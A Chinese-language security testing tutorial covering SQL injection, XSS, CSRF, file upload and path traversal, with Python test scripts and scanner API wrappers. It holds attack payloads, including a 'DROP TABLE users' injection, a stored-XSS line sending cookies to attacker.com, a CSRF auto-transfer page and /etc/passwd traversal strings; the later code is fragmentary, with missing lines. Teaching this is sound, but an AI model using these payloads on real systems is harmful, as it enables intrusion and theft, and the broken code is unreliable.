## 1. 安全测试概述

### 1.1 什么是安全测试

安全测试（Security Testing）是评估系统安全性、识别安全漏洞、验证安全控制措施有效性的测试过程。目的是发现潜在的安全风险，确保系统在面对恶意攻击时能够保护数据和功能。

```
安全测试目标：
├── 机密性（Confidentiality）
│   └── 确保数据只能被授权用户访问
├── 完整性（Integrity）
│   └── 确保数据不被未授权修改
├── 可用性（Availability）
│   └── 确保授权用户能够正常访问
└── 不可抵赖性（Non-repudiation）
    └── 确保操作可追溯，无法否认
```

### 1.2 安全测试的重要性

```
安全风险后果：
├── 数据泄露
│   ├── 用户隐私信息泄露
│   ├── 商业机密泄露
│   └── 法律合规风险
├── 财务损失
│   ├── 直接经济损失
│   ├── 赔偿和罚款
│   └── 业务中断
├── 声誉损害
│   ├── 用户信任度下降
│   ├── 品牌形象受损
│   └── 客户流失
└── 法律责任
    ├── GDPR、网络安全法等合规要求
    ├── 行政处罚
    └── 刑事责任
```

### 1.3 安全测试类型

| 测试类型 | 描述 | 重点 | 工具示例 |
|---------|------|------|---------|
| **漏洞扫描** | 自动化扫描已知漏洞 | 快速发现常见问题 | Nessus, OpenVAS |
| **渗透测试** | 模拟黑客攻击 | 发现深层漏洞 | Burp Suite, Metasploit |
| **代码审计** | 静态代码分析 | 源码级安全问题 | SonarQube, Checkmarx |
| **配置审计** | 系统配置检查 | 配置不当问题 | Lynis, OpenSCAP |
| **社会工程学** | 人为因素测试 | 钓鱼、欺骗等 | 自定义测试 |
| **应急响应** | 事件处理测试 | 安全事件响应能力 | 模拟演练 |

### 2.2 SQL注入（SQL Injection）

#### 原理

攻击者通过在输入字段中插入SQL代码，欺骗数据库执行恶意SQL语句。

#### 攻击示例

```python
-- 原始查询
SELECT * FROM users WHERE username = '输入的用户名' AND password = '输入的密码'

-- 攻击1：绕过登录
用户名：admin' OR '1'='1
密码：任意
-- 结果查询：
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '任意'
-- '1'='1' 永远为真，绕过认证

-- 攻击2：获取所有用户数据
用户名：' UNION SELECT * FROM users --
-- 结果查询：
SELECT * FROM users WHERE username = '' UNION SELECT * FROM users --' AND password = ''
-- 注释符 -- 使后面语句失效，UNION获取所有用户数据

-- 攻击3：删除表
用户名：'; DROP TABLE users; --
-- 结果查询：
SELECT * FROM users WHERE username = ''; DROP TABLE users; --' AND password = ''
-- 执行删除操作
```

#### 漏洞代码示例

```bash
# ❌ 危险代码 - 直接拼接SQL

def login_vulnerable(username, password):
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    # 执行查询...
    return result

# ✅ 安全代码 - 使用参数化查询

def login_safe(username, password):
    query = "SELECT * FROM users WHERE username=%s AND password=%s"
    cursor.execute(query, (username, password))
    return cursor.fetchone()

# ✅ 安全代码 - 使用ORM

def login_orm(username, password):
    user = User.query.filter_by(username=username).first()
    if user and user.check_password(password):
        return user
    return None
```

#### 测试方法

```bash
# SQL注入测试脚本

import requests

def test_sql_injection(url, param_name):
    """测试SQL注入漏洞"""
    test_cases = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' UNION SELECT NULL --",
        "admin' --",
        "'; DROP TABLE users; --",
        "' OR SLEEP(5) --",
        "1' AND '1'='1",
        "' OR 'a'='a"
    ]

    for payload in test_cases:
        params = {param_name: payload}
        try:
            response = requests.get(url, params=params, timeout=10)

            # 检测延迟（时间盲注）
            if response.elapsed.total_seconds() > 3:
                print(f"[!] 时间盲注可能: {payload}")

            # 检测错误信息
            if "SQL" in response.text or "syntax" in response.text:
                print(f"[!] SQL错误信息泄露: {payload}")

            # 检测内容变化
            if "admin" in response.text or "root" in response.text:
                print(f"[!] 可能注入成功: {payload}")

        except requests.exceptions.Timeout:
            print(f"[!] 超时，可能时间盲注: {payload}")
        except Exception as e:
            print(f"[-] 测试失败: {e}")

# 使用示例

test_sql_injection("https://example.com/login", "username")
```

### 2.3 XSS（跨站脚本攻击）

#### 原理

攻击者在网页中注入恶意脚本，当其他用户访问时执行。

#### 类型

```python
// 1. 反射型XSS（Reflected XSS）
// 攻击者构造恶意链接
https://example.com/search?q=<script>alert('XSS')</script>

// 2. 存储型XSS（Stored XSS）
// 攻击者在评论区提交
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>

// 3. DOM型XSS（DOM-based XSS）
// 前端代码
var input = document.getElementById('input').value;
document.write('<div>' + input + '</div>');
// 攻击：输入 </div><script>alert('XSS')</script>
```

#### 测试方法

```bash
# XSS测试脚本

def test_xss(url, param_name):
    """测试XSS漏洞"""
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "'-alert(1)-'",
        "\"-alert(1)-\"",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>"
    ]

    for payload in xss_payloads:
        params = {param_name: payload}
        response = requests.get(url, params=params)

        # 检查payload是否原样返回
        if payload in response.text:
            print(f"[!] XSS可能: {payload}")

        # 检查是否被转义
        if "<script>" in response.text or "<img" in response.text:
            print(f"[-] 已转义: {payload}")
        elif "<script>" in response.text:
            print(f"[!] XSS成功: {payload}")

# 测试DOM型XSS

def test_dom_xss():
    """测试DOM型XSS"""
    # 需要浏览器自动化
    from selenium import webdriver
    from selenium.webdriver.common.by import By

    driver = webdriver.Chrome()
    driver.get("https://example.com")

    # 注入payload
    driver.execute_script("""
        document.getElementById('input').value = "<img src=x onerror=alert('XSS')>";
        document.getElementById('submit').click();
    """)

    # 检查是否弹窗
    try:
        alert = driver.switch_to.alert
        print("[!] DOM XSS成功")
        alert.accept()
    except:
        print("[-] 无弹窗")

    driver.quit()
```

### 2.4 CSRF（跨站请求伪造）

#### 原理

攻击者诱导用户在已认证的情况下执行非预期的操作。

```
CSRF攻击流程：
1. 用户登录网站A（example.com），浏览器保存cookie
2. 用户访问恶意网站B（attacker.com）
3. 网站B包含自动提交表单到网站A
4. 浏览器自动携带cookie提交请求
5. 网站A误认为是用户正常操作
```

#### 攻击示例

```python
<!-- 恶意网站HTML -->
<!DOCTYPE html>
<html>
<body>
    <h1>恭喜中奖！点击领取</h1>
    <!-- 自动提交的表单 -->
    <form action="https://bank.com/transfer" method="POST" id="csrfForm">
        <input type="hidden" name="to" value="attacker_account">
        <input type="hidden" name="amount" value="10000">
    </form>
    <script>
        // 自动提交
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
```

#### 防御与测试

```bash
# 测试CSRF漏洞

def test_csrf(url, params, session):
    """测试CSRF保护"""
    # 1. 检查是否有CSRF Token
    response = session.get(url)
    if "csrf_token" not in response.text:
        print("[!] 缺少CSRF Token")

    # 2. 尝试无Token提交
    response = session.post(url, data=params)
    if response.status_code == 200:
        print("[!] 无Token也能提交，存在CSRF漏洞")

    # 3. 检查Referer验证
    headers = {"Referer": "https://evil.com"}
    response = session.post(url, data=params, headers=headers)
    if response.status_code == 200:
        print("[!] Referer验证绕过")

    # 4. 检查SameSite属性
    cookies = session.cookies.get_dict()
    for name, value in cookies.items():
        if "SameSite" not in str(value):
            print(f"[-] Cookie {name} 缺少SameSite属性")

# 防御措施

"""
1. CSRF Token
   - 每个表单包含随机Token
   - 服务器验证Token有效性

2. SameSite Cookie
   - Set-Cookie: sessionid=xxx; SameSite=Strict

3. Referer验证
   - 检查请求来源域名

4. 二次验证
   - 敏感操作要求重新输入密码
"""
```

### 2.5 文件上传漏洞

#### 原理

未正确验证上传文件类型和内容，导致恶意文件上传。

```bash
# 危险的文件上传代码

def upload_file(file):
    # ❌ 只检查文件扩展名
    if file.filename.endswith('.jpg'):
        save_path = f"uploads/{file.filename}"
        file.save(save_path)
        return "上传成功"

# 攻击方法：
# 1. 修改扩展名：shell.php.jpg
# 2. 双重扩展名：shell.php.jpg
# 3. 空字节截断：shell.php\0.jpg
# 4. 大小写混淆：shell.PHP
# 5. MIME类型伪造

```

#### 测试方法

```python
def test_file_upload(url):
    """测试文件上传漏洞"""
    test_files = [
        ("test.php", "<?php phpinfo(); ?>", "application/x-php"),
        ("test.jpg", "GIF89a<?php phpinfo(); ?>", "image/jpeg"),
        ("test.php.jpg", "<?php phpinfo(); ?>", "image/jpeg"),
        ("test.phtml", "<?php phpinfo(); ?>", "application/octet-stream"),
    ]

    for filename, content, mime in test_files:
        files = {"file": (filename, content, mime)}
        response = requests.post(url, files=files)

        if response.status_code == 200:
            print(f"[!] 上传成功: {filename}")

            # 检查是否可访问
            upload_url = response.json().get("url")
            if upload_url:
                r = requests.get(upload_url)
                if "PHP" in r.text or "phpinfo" in r.text:
                    print(f"[!] 恶意文件可执行: {filename}")

# 防御措施

"""
1. 文件类型验证
   - 检查文件头（Magic Number）
   - 使用白名单策略

2. 文件名处理
   - 重命名文件
   - 过滤特殊字符

3. 存储位置
   - 不在web根目录
   - 禁止执行权限

4. 内容检测
   - 图片：使用ImageMagick验证
   - 病毒扫描
"""
```

# 使用ZAP API

import requests

class ZAPScanner:
    def __init__(self, api_key, zap_host="localhost", zap_port=8080):
        self.api_key = api_key
        self.base_url = f"http://{zap_host}:{zap_port}/JSON"

    def spider_scan(self, url):
        """爬虫扫描"""
        response = requests.get(
            f"{self.base_url}/spider/action/scan",
            params={"url": url, "apikey": self.api_key}
        )
        return response.json()

    def active_scan(self, url):
        """主动扫描"""
        response = requests.get(
            f"{self.base_url}/ascan/action/scan",
            params={"url": url, "apikey": self.api_key}
        )
        return response.json()

    def get_alerts(self, url):
        """获取漏洞列表"""
        response = requests.get(
            f"{self.base_url}/core/view/alerts",
            params={"baseurl": url, "apikey": self.api_key}
        )
        return response.json()

# 使用示例

### 3.4 移动端安全工具

#### MobSF（移动安全框架）

```bash
# 使用MobSF API

import requests

class MobSFScanner:
    def __init__(self, api_key, host="localhost", port=8000):
        self.api_key = api_key
        self.base_url = f"http://{host}:{port}/api/v1"

    def upload_apk(self, apk_path):
        """上传APK"""
        with open(apk_path, 'rb') as f:
            files = {'file': f}
            response = requests.post(
                f"{self.base_url}/upload",
                files=files,
                data={"api_key": self.api_key}
            )
        return response.json()

    def scan(self, hash_value):
        """开始扫描"""
        response = requests.post(
            f"{self.base_url}/scan",
            data={"hash": hash_value, "api_key": self.api_key}
        )
        return response.json()

    def report(self, hash_value):
        """获取报告"""
        response = requests.get(
            f"{self.base_url}/report",
            params={"hash": hash_value, "api_key": self.api_key}
        )
        return response.json()

# 使用示例

mobsf = MobSFScanner("your_api_key")
upload = mobsf.upload_apk("app.apk")
scan_result = mobsf.scan(upload["hash"])
report = mobsf.report(upload["hash"])

print("安全问题:", len(report["findings"]))
for finding in report["findings"]:
    print(f"[{finding['severity']}] {finding['title']}")
```

## 4. 安全测试流程

### 4.1 标准测试流程

```
安全测试流程：
├── 1. 信息收集
│   ├── 确定测试范围
│   ├── 收集目标信息（域名、IP、技术栈）
│   └── 识别资产
├── 2. 威胁建模
│   ├── 识别潜在威胁
│   ├── 评估风险等级
│   └── 确定测试重点
├── 3. 漏洞扫描
│   ├── 自动化扫描
│   ├── 识别已知漏洞
│   └── 生成初步报告
├── 4. 手动测试
│   ├── 验证扫描结果
│   ├── 深度测试
│   └── 发现逻辑漏洞
├── 5. 漏洞验证
│   ├── 确认漏洞存在
│   ├── 评估影响范围
│   └── 验证可利用性
├── 6. 报告编写
│   ├── 漏洞描述
│   ├── 复现步骤
│   ├── 风险等级
│   └── 修复建议
└── 7. 复测
    ├── 验证修复效果
    └── 确认无回归
```

```bash
# 测试环境配置

import requests
import json

class WebSecurityTester:
    def __init__(self, target_url, auth_user=None, auth_pass=None):
        self.target = target_url
        self.session = requests.Session()
        self.vulnerabilities = []

        # 登录认证
        if auth_user and auth_pass:
            self.login(auth_user, auth_pass)

    def login(self, username, password):
        """登录系统"""
        login_url = f"{self.target}/login"
        data = {"username": username, "password": password}
        response = self.session.post(login_url, data=data)
        return response.status_code == 200

    def add_vulnerability(self, vuln_type, severity, description, payload=None):
        """记录漏洞"""
        self.vulnerabilities.append({
            "type": vuln_type,
            "severity": severity,
            "description": description,
            "payload": payload,
            "timestamp": __import__('datetime').datetime.now().isoformat()
        })

    def generate_report(self):
        """生成报告"""
        report = {
            "target": self.target,
            "summary": {
                "total": len(self.vulnerabilities),
                "high": len([v for v in self.vulnerabilities if v["severity"] == "High"]),
                "medium": len([v for v in self.vulnerabilities if v["severity"] == "Medium"]),
                "low": len([v for v in self.vulnerabilities if v["severity"] == "Low"])
            },
            "vulnerabilities": self.vulnerabilities
        }

        with open("security_report.json", "w") as f:
            json.dump(report, f, indent=2)

        return report
```

        self.print_report(report)

    def test_information_disclosure(self):
        """测试信息泄露"""
        print("\n[+] 测试信息泄露...")

        # 测试错误页面
        response = requests.get(f"{self.target}/nonexistent")
        if "stack trace" in response.text or "error" in response.text.lower():
            self.tester.add_vulnerability(
                "信息泄露",
                "Medium",
                "错误页面泄露系统信息",
                response.text[:200]
            )

        # 测试目录列表
        response = requests.get(f"{self.target}/uploads/")
        if "Index of" in response.text:
            self.tester.add_vulnerability(
                "目录遍历",
                "High",
                "目录列表暴露",
                f"{self.target}/uploads/"
            )

    def test_sql_injection(self):
        """测试SQL注入"""
        print("\n[+] 测试SQL注入...")

        # 测试登录接口
        login_url = f"{self.target}/login"
        test_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "admin' --",
            "' UNION SELECT NULL --"
        ]

        for payload in test_payloads:
            data = {"username": payload, "password": "test"}
            try:
                response = self.session.post(login_url, data=data, timeout=5)

                # 检测成功登录或错误信息
                if "admin" in response.text or "SQL" in response.text:
                    self.tester.add_vulnerability(
                        "SQL注入",
                        "High",
                        f"登录接口存在SQL注入: {payload}",
                        payload
                    )
                    break
            except:
                pass

        # 测试搜索接口
        search_url = f"{self.target}/search"
        for payload in test_payloads:
            params = {"q": payload}
            try:
                response = requests.get(search_url, params=params, timeout=5)
                if "SQL" in response.text or "syntax" in response.text:
                    self.tester.add_vulnerability(
                        "SQL注入",
                        "High",
                        f"搜索接口存在SQL注入: {payload}",
                        payload
                    )
                    break
            except:
                pass

    def test_xss(self):
        """测试XSS"""
        print("\n[+] 测试XSS...")

        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert(1)>",
            "javascript:alert('XSS')"
        ]

        # 测试评论/反馈接口
        comment_url = f"{self.target}/comment"
        for payload in xss_payloads:
            data = {"comment": payload}
            try:
                response = self.session.post(comment_url, data=data)

                # 检查是否存储并返回
                if payload in response.text and "<script>" in response.text:
                    self.tester.add_vulnerability(
                        "XSS",
                        "High",
                        f"存储型XSS: {payload}",
                        payload
                    )
                    break
            except:
                pass

        # 测试URL参数
        for payload in xss_payloads:
            params = {"search": payload}
            try:
                response = requests.get(f"{self.target}/search", params=params)
                if payload in response.text and "<script>" in response.text:
                    self.tester.add_vulnerability(
                        "XSS",
                        "Medium",
                        f"反射型XSS: {payload}",
                        payload
                    )
                    break
            except:
                pass

    def test_csrf(self):
        """测试CSRF"""
        print("\n[+] 测试CSRF...")

        # 检查是否有CSRF Token
        response = self.session.get(f"{self.target}/profile")
        if "csrf_token" not in response.text:
            self.tester.add_vulnerability(
                "CSRF",
                "Medium",
                "缺少CSRF Token保护",

        headers = {"Referer": "https://evil.com"}
        response = self.session.post(transfer_url, data=data, headers=headers)

            self.tester.add_vulnerability(
                "CSRF",
                "High",
                "CSRF保护可绕过",
                "Referer检查不严格"
            )

    def test_file_upload(self):
        """测试文件上传"""
        print("\n[+] 测试文件上传...")

        upload_url = f"{self.target}/upload"

        # 测试恶意文件

            ("shell.php.jpg", "<?php phpinfo(); ?>", "image/jpeg"),
            ("test.phtml", "<?php phpinfo(); ?>", "application/octet-stream")
        ]

        for filename, content, mime in malicious_files:
            files = {"file": (filename, content, mime)}
            try:

                        "文件上传",
                        "High",
                        f"恶意文件上传成功: {filename}",

                    )

            except:
                pass

    def test_auth_bypass(self):
        """测试认证绕过"""
        print("\n[+] 测试认证绕过...")

        # 测试直接访问管理页面
        admin_urls = [
            f"{self.target}/admin",
            f"{self.target}/admin/users",
            f"{self.target}/admin/settings"
        ]

        for url in admin_urls:
            response = requests.get(url)
            if response.status_code == 200:
                self.tester.add_vulnerability(
                    "认证绕过",
                    "High",
                    f"未授权访问: {url}",
                    url
                )

        # 测试参数篡改

            response = requests.get(f"{self.target}/profile?id={user_id}")
            if response.status_code == 200 and "username" in response.text:

                    "越权访问",
                    "Medium",
                    f"水平越权: 查看用户{user_id}信息",
                    f"id={user_id}"
                )

    def test_directory_traversal(self):
        """测试目录遍历"""
        print("\n[+] 测试目录遍历...")

        traversal_payloads = [
            "../../../etc/passwd",
            "....//....//etc/passwd",
            "....//....//....//windows/win.ini"
        ]

        for payload in traversal_payloads:
            params = {"file": payload}
            try:
                response = requests.get(f"{self.target}/download", params=params)

                if "root:" in response.text or "[fonts]" in response.text:
                    self.tester.add_vulnerability(
                        "目录遍历",
                        "High",
                        f"目录遍历漏洞: {payload}",
                        payload
                    )
                    break
            except:
                pass

    def test_sensitive_info(self):
        """测试敏感信息泄露"""
        print("\n[+] 测试敏感信息泄露...")

        # 检查常见敏感文件
        sensitive_files = [
            "/config.php",
            "/database.yml",
            "/.env",
            "/backup.sql",
            "/README.md"
        ]

        for file in sensitive_files:
            response = requests.get(f"{self.target}{file}")
            if response.status_code == 200:
                # 检查是否包含敏感信息
                text = response.text.lower()
                if any(keyword in text for keyword in ["password", "secret", "key", "api"]):
                    self.tester.add_vulnerability(
                        "信息泄露",
                        "High",
                        f"敏感文件可访问: {file}",
                        file
                    )

    def print_report(self, report):
        """打印报告"""
        print("\n" + "="*60)
        print("安全测试报告")
        print("="*60)
        print(f"目标: {report['target']}")
        print(f"总漏洞数: {report['summary']['total']}")
        print(f"高危: {report['summary']['high']}")
        print(f"中危: {report['summary']['medium']}")
        print(f"低危: {report['summary']['low']}")

        for vuln in report['vulnerabilities']:

            if vuln['payload']:
                print(f"Payload: {vuln['payload']}")
            print("-" * 40)

class SecureCoding:
    """安全编码示例"""

    @staticmethod
    def validate_input(input_data, pattern):
        """输入验证"""
        import re
        if not re.match(pattern, input_data):
            raise ValueError("Invalid input")
        return input_data

    @staticmethod
    def sanitize_sql(input_str):
        """SQL注入防护"""
        # 使用参数化查询
        return "SELECT * FROM users WHERE username = %s", (input_str,)

    @staticmethod
    def encode_html(input_str):
        """XSS防护"""
        import html
        return html.escape(input_str)

    @staticmethod
    def hash_password(password):
        """密码哈希"""
        import bcrypt
        salt = bcrypt.gensalt()
        return bcrypt.hashpw(password.encode('utf-8'), salt)

    @staticmethod
    def generate_csrf_token():
        """生成CSRF Token"""
        import secrets
        return secrets.token_hex(32)
